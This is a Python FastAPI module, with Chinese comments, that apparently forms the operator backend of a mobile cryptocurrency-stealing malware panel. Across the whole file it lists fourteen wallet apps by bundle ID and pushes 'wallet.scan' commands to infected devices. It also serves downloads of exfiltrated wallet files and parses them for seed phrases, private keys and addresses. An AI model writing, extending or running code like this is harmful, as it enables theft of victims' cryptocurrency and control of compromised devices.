from fastapi import APIRouter, Depends, HTTPException, Query, Request
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from sqlalchemy import desc
from pathlib import Path
from ..database import get_db, ExfilData, create_audit_log
from ..auth import get_current_user
from .notifications import broadcast_notification_sync
from typing import Optional, List

router = APIRouter(prefix="/api/wallets", tags=["wallets"])

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

# 支持的钱包类型
WALLET_TYPES = {
    "metamask": {"name": "MetaMask", "chain": "Ethereum/BSC/Polygon", "bundle_id": "io.metamask"},
    "trust": {"name": "Trust Wallet", "chain": "Multi-chain", "bundle_id": "com.trustwallet.app"},
    "coinbase": {"name": "Coinbase Wallet", "chain": "Ethereum", "bundle_id": "org.coinbase.wallet"},
    "imtoken": {"name": "imToken", "chain": "Multi-chain", "bundle_id": "org.consenlabs.tokens"},
    "tokenpocket": {"name": "TokenPocket", "chain": "Multi-chain", "bundle_id": "com.tokenpocket.wallet"},
    "alphawallet": {"name": "AlphaWallet", "chain": "Ethereum", "bundle_id": "io.stormbird.wallet"},
    "mathwallet": {"name": "MathWallet", "chain": "Multi-chain", "bundle_id": "com.mathwallet"},
    "tronlink": {"name": "TronLink", "chain": "Tron", "bundle_id": "org.tronlink.wallet"},
    "onto": {"name": "ONTO", "chain": "Multi-chain", "bundle_id": "com.onto.wallet"},
    "bitpie": {"name": "Bitpie", "chain": "Multi-chain", "bundle_id": "com.bitpie.wallet"},
    "huobi": {"name": "Huobi Wallet", "chain": "Multi-chain", "bundle_id": "com.huobi.wallet"},
    "phantom": {"name": "Phantom", "chain": "Solana", "bundle_id": "app.phantom"},
    "keplr": {"name": "Keplr", "chain": "Cosmos", "bundle_id": "com.keplr.wallet"},
    "cosmostation": {"name": "Cosmostation", "chain": "Cosmos", "bundle_id": "com.cosmostation.wallet"},
}


@router.get("/types")
async def get_wallet_types(current_user=Depends(get_current_user)):
    """获取支持的钱包类型列表"""
    return WALLET_TYPES


@router.get("")
async def get_wallets(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    wallet_type: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """获取钱包数据列表"""
    query = db.query(ExfilData).filter(ExfilData.category == 'wallet').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    if wallet_type:
        query = query.filter(ExfilData.description.contains(wallet_type))
    total = query.count()
    items = query.offset(skip).limit(limit).all()
    return {"total": total, "items": items}


@router.get("/stats")
async def get_wallet_stats(
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """获取钱包统计信息"""
    total = db.query(ExfilData).filter(ExfilData.category == 'wallet').count()
    
    stats = {
        "total_wallets": total,
        "by_type": {},
        "by_device": {}
    }
    
    # 按设备统计
    wallets = db.query(ExfilData).filter(ExfilData.category == 'wallet').all()
    for w in wallets:
        # 按设备统计
        if w.device_uuid not in stats["by_device"]:
            stats["by_device"][w.device_uuid] = 0
        stats["by_device"][w.device_uuid] += 1
        
        # 按钱包类型统计
        for wtype, winfo in WALLET_TYPES.items():
            if w.description and wtype in w.description.lower():
                if wtype not in stats["by_type"]:
                    stats["by_type"][wtype] = 0
                stats["by_type"][wtype] += 1
                break
    
    return stats


@router.get("/{wallet_id}")
async def get_wallet_detail(
    wallet_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """获取钱包数据详情"""
    wallet = db.query(ExfilData).filter(ExfilData.id == wallet_id).first()
    if not wallet:
        raise HTTPException(status_code=404, detail="Wallet data not found")
    return wallet


@router.get("/{wallet_id}/download")
async def download_wallet_data(
    wallet_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """下载钱包数据文件"""
    wallet = db.query(ExfilData).filter(ExfilData.id == wallet_id).first()
    if not wallet:
        raise HTTPException(status_code=404, detail="Wallet data not found")
    
    file_path = Path(wallet.file_path)
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")
    
    return FileResponse(str(file_path), filename=file_path.name)


@router.delete("/{wallet_id}")
async def delete_wallet(
    request: Request,
    wallet_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """删除钱包数据"""
    wallet = db.query(ExfilData).filter(ExfilData.id == wallet_id).first()
    if not wallet:
        raise HTTPException(status_code=404, detail="Wallet data not found")

    file_path = Path(wallet.file_path)
    if file_path.exists():
        file_path.unlink()

    db.delete(wallet)
    db.commit()

    username = current_user.username if current_user else "anonymous"
    create_audit_log(
        db, username=username, action="wallet_delete", resource_type="wallet",
        resource_id=wallet_id, detail=f"Deleted wallet data {wallet_id} (device: {wallet.device_uuid})",
        ip_address=request.client.host if request.client else None
    )
    return {"message": "Wallet data deleted"}


@router.post("/scan")
async def scan_wallets(
    request: Request,
    device_uuid: str,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """触发设备钱包扫描命令"""
    from ..database import Command
    from datetime import datetime

    # 创建扫描命令
    commands = []
    for wtype, winfo in WALLET_TYPES.items():
        cmd = Command(
            device_uuid=device_uuid,
            command=f"wallet.scan {wtype} {winfo['bundle_id']}",
            status="pending"
        )
        db.add(cmd)
        commands.append(wtype)

    db.commit()

    username = current_user.username if current_user else "anonymous"
    create_audit_log(
        db, username=username, action="wallet_scan", resource_type="wallet",
        detail=f"Triggered wallet scan for device {device_uuid}, {len(commands)} wallet types",
        ip_address=request.client.host if request.client else None
    )
    broadcast_notification_sync(
        db, title="钱包扫描已触发", message=f"用户 {username} 对设备 {device_uuid} 发起了钱包扫描",
        category="wallet", related_device_uuid=device_uuid, related_resource_type="wallet"
    )

    return {
        "message": f"已发送{len(commands)}个钱包扫描命令",
        "wallet_types": commands
    }


@router.get("/parsed")
async def get_parsed_wallets(
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """获取已成功解析助记词的钱包"""
    wallets = db.query(ExfilData).filter(ExfilData.category == 'wallet').all()
    parsed = []
    
    for wallet in wallets:
        file_path = Path(wallet.file_path)
        if not file_path.exists():
            continue
        
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            
            mnemonic = None
            private_key = None
            address = None
            
            if content.startswith('{'):
                import json
                try:
                    data = json.loads(content)
                    mnemonic = data.get('mnemonic') or data.get('seed') or data.get('phrase')
                    private_key = data.get('privateKey') or data.get('private_key')
                    address = data.get('address') or data.get('walletAddress')
                except:
                    pass
            
            if not mnemonic:
                words = content.split()
                if 12 <= len(words) <= 24:
                    import re
                    word_pattern = re.compile(r'^[a-z]{3,8}$')
                    potential_words = [w for w in words if word_pattern.match(w)]
                    if 12 <= len(potential_words) <= 24:
                        mnemonic = ' '.join(potential_words)
            
            if mnemonic:
                parsed.append({
                    "id": wallet.id,
                    "device_uuid": wallet.device_uuid,
                    "path": wallet.path,
                    "description": wallet.description,
                    "uploaded_at": wallet.uploaded_at,
                    "mnemonic": mnemonic,
                    "private_key": private_key,
                    "address": address
                })
        except Exception:
            continue
    
    return parsed


@router.get("/mnemonic/{wallet_id}")
async def get_mnemonic(
    wallet_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """解析钱包助记词"""
    wallet = db.query(ExfilData).filter(ExfilData.id == wallet_id).first()
    if not wallet:
        raise HTTPException(status_code=404, detail="Wallet data not found")
    
    file_path = Path(wallet.file_path)
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")
    
    try:
        content = file_path.read_text(encoding='utf-8', errors='ignore')
        
        # 解析助记词
        mnemonic = None
        private_key = None
        address = None
        
        # 尝试解析JSON格式
        if content.startswith('{'):
            import json
            try:
                data = json.loads(content)
                mnemonic = data.get('mnemonic') or data.get('seed') or data.get('phrase')
                private_key = data.get('privateKey') or data.get('private_key')
                address = data.get('address') or data.get('walletAddress')
            except:
                pass
        
        # 尝试从文本中提取助记词
        if not mnemonic:
            words = content.split()
            if 12 <= len(words) <= 24:
                import re
                word_pattern = re.compile(r'^[a-z]{3,8}$')
                potential_words = [w for w in words if word_pattern.match(w)]
                if 12 <= len(potential_words) <= 24:
                    mnemonic = ' '.join(potential_words)
        
        return {
            "wallet_id": wallet_id,
            "mnemonic": mnemonic,
            "private_key": private_key,
            "address": address,
            "raw_content": content[:1000] if len(content) > 1000 else content
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"解析失败: {str(e)}")
